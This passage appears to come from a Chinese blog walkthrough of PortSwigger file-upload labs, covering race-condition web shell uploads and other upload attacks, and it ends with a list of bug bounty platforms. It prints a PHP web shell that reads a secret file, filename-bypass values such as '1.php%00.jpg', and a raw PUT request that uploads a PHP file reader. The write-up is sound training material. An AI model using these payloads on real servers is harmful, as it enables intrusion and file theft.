 <img alt="" height="787" src="https://img-blog.csdnimg.cn/bcf27547d78040e3b2be0832db3b4930.png" width="1200"/>
生成的2.php
 <img alt="" height="247" src="https://img-blog.csdnimg.cn/df7891d5c7e04b45b5cfa0a14a7021de.png" width="914"/>
<br/>  
<hr/>
part3：
上传2.php文件




<hr/>
part4：
完成实验
在HTTP历史记录中浏览请求包
找到GET/files/avatars/2.php请求
使用消息编辑器的搜索功能在响应的二进制映像数据中查找START字符串（在START和END字符串之间）
<pre><code>我的为：
START aH5pHp2hMMgR0pczTx9c5UCo48I5eDf2 END</code></pre>

 提交完成实验<img alt="" height="724" src="https://img-blog.csdnimg.cn/7980acdf53f747a7b01ad31ae71a65f6.png" width="1200"/>



---


---


> 
<h3>6、利用文件上载争用条件</h3>
1、现代框架更能抵御这类攻击。它们通常不会将文件直接上载到文件系统上的预定目的地。相反会采取一些预防措施，比如先上传到一个临时的沙箱目录，然后随机化名称以避免覆盖现有文件。然后对该临时文件执行验证，并仅在认为安全时才将其传输到目标。
<hr/>
2、即开发人员有时独立于任何框架实现自己的文件上传处理。这样做不仅相当复杂，而且还可能引入危险的争用条件，使攻击者能够完全绕过甚至是最健壮的验证。
<hr/>
3、如一些网站直接将文件上传到主文件系统，如果没有通过验证，则再次删除它。这种行为在依赖于防病毒软件等来检查恶意软件的网站中是典型的。这可能只需要几毫秒的时间，但由于文件在服务器上存在的时间很短，攻击者仍有可能执行它。
<hr/>
4、这些漏洞通常非常隐蔽，因此在黑盒测试期间很难检测到，除非能够找到泄漏相关源代码的方法。 
<hr/>
5、涉及实验：<br/> 实验7：通过竞态条件的Web外壳上载
<hr/>
6、基于URL的文件上载中的争用条件
1）在允许通过提供URL来上载文件的函数中也会出现类似的争用情况。在这种情况下，服务器必须通过Internet获取文件并创建本地副本，然后才能执行任何验证。
2）由于文件是使用HTTP加载的，因此开发人员无法使用其框架的内置机制来安全地验证文件。相反可以手动创建自己的进程来临时存储和验证文件，这可能不是很安全。
3）例如，如果文件以随机化名称加载到临时目录中，则理论上攻击者应该不可能利用任何争用条件。如果他们不知道目录的名称，他们将无法请求文件以触发其执行。另一方面，如果随机化的目录名是使用伪随机函数（如PHP的uniqid（））生成的，则它可能会被强制执行。
4）要使此类攻击变得更容易，可以尝试延长处理文件所需的时间，从而延长暴力强制目录名的窗口。其中一种方法是上传一个更大的文件。如果它是分块处理的，那么可能会利用这一点，创建一个恶意文件，该文件的开头是有效负载，后面是大量的任意填充字节


---


---


> 
<h3>实验7：通过竞态条件的Web外壳上载</h3>
信息：
本实验包含易受攻击的图像上载函数。尽管它对上载的任何文件都执行可靠的验证，但也可以通过在处理文件的方式中利用争用条件来完全绕过此验证。
要解决实验问题，请上传一个基本的PHP Web shell，然后使用它对文件/home/carlos/secret的内容进行过滤并提交<br/> 已有账号：wiener:peter
<hr/>
part1:
登录并上传图像作为您的头像，然后返回帐户页面
电脑上，创建一个php文件，其中包含一个用于获取Carlos秘密内容的脚本
<pre>`&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;`</pre>

响应表明只允许您上载JPG和PNG文件（后缀的限制）


<hr/>

part2:
 在Burp的HTTP历史记录中，找到用于提交文件上传的POST/my-account/avatar请求。把这个发给repeater
（测试发现，无法截断）
<pre>`filename="1.php%00.jpg"`</pre>


<pre>`filename="1.php.jpg"`</pre>

 <br/>  
<hr/>
part3：
题目提供方法（不可行，后面有我使用的方法）



<pre><code>1、在脚本中，替换&lt;YOUR-POST-REQUEST&gt;为包含1.php文件的完整POST /my-account/avatar请求。
2、替换&lt;YOUR-GET-REQUEST&gt;为获取上载的PHP文件的GET请求。
3、在Turbo Intruder窗口底部，单击Attack（攻击）。这个脚本将提交一个POST请求来上传1.php文件，然后立即向/files/avatars/1.php提交5个GET请求。

</code></pre>


 POST是上传1.php

 GET是请求1.php（5次）<img alt="" height="636" src="https://img-blog.csdnimg.cn/c5cfdd4367254045b20c3365aa775edc.png" width="1200"/>


<hr/>
part4：
我使用的方法
第一步：
将GET请求发送到工具模块

 设置空载荷，进行无限制请求，并点击开始攻击



第二步：
手动发送POST上传1.php请求

 观察攻击结果
有2个访问2.php成功


<hr/>
part5：
完成实验：
<pre>`I2QietA8if5UkM16O8dz1cFrtgeIC2Vi`</pre>




---


---


---


---


## 四、利用文件上载漏洞而不远程执行代码

> 
<h3>1、上传恶意客户端脚本</h3>
1、虽然可能无法在服务器上执行脚本，但仍然可以上载脚本以进行客户端攻击。如果可以上载HTML文件或SVG图像，则可以使用&lt;script&gt;标记创建存储的XSS有效负载。
————
2、如果上载的文件随后出现在其他用户访问的页面上，则他们的浏览器将在尝试呈现该页面时执行该脚本（由于同源策略限制，这些类型的攻击只有在上载文件来自与上载文件相同的源时才会起作用）<br/>  
<hr/>
<h3>2、利用上载文件解析中的漏洞</h3>
1、如果上传的文件看起来存储和提供都很安全，那么最后的办法就是尝试利用解析或处理不同文件格式时特有的漏洞
————
2、如知道服务器解析基于XML的文件，如MicrosoftOffice文件或. xls文件，这可能是潜在的XXE注射液攻击。 
<hr/>
<h3>3、使用PUT上载文件</h3>
值得注意的是，一些web服务器可能被配置为支持PUT请求。如果没有适当的防御措施，这可能会提供上传恶意文件的替代方法，即使无法通过Web界面使用上传功能。
<pre><code>PUT /images/1.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

&lt;?php echo file_get_contents('/path/to/file'); ?&gt;</code></pre>



### 2、利用上载文件解析中的漏洞

---


---


---


<img alt="" src="https://img-blog.csdnimg.cn/7d62be979184459ab44139ed85f387fe.png"/>​

> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>​网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>​First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>​目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>​目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[看雪渗透测试服务](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>​Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>​目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year 

---

